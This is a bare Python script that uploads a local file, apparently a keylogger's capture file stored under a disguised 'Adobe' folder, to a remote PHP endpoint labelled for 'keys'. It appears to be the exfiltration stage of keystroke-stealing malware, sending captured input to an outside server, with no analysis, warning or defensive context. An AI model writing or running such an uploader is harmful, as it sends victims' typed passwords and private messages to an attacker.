import requests

url = 'http://antburger.guormit.cf/index.php?p=keys'

files = {'file': open('C:/Win/Adobe/KLLG/keyslogs.txt', 'rb')}

r = requests.post(url, files=files)
print(r.status_code)
print(r.text)
